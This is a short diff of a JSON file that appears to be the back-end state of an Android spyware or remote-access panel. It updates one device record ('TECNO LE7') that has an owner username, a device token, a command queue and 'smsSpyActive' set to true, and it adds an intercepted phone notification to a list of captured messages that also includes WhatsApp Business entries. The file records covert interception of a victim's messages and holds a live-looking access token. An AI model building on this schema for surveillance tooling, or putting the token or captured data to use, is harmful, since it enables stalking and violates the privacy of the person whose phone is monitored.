@@ -17558,7 +17558,7 @@
     "deviceName": "TECNO LE7",
     "ownerUsername": "Zal7Sex",
     "token": "300fd4cdf8c477789624b33da25326f3",
-    "lastSeen": 1777449557479,
+    "lastSeen": 1777449566488,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-29T07:45:34.574Z",
@@ -17574,6 +17574,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Messages",
+        "sender": "",
+        "content": "Messages is doing work in the background",
+        "time": "29/04 14:59",
+        "pkg": "com.google.android.apps.messaging",
+        "receivedAt": 1777449567415
+      },
       {
         "appName": "WA Business",
         "sender": "WhatsApp Business",
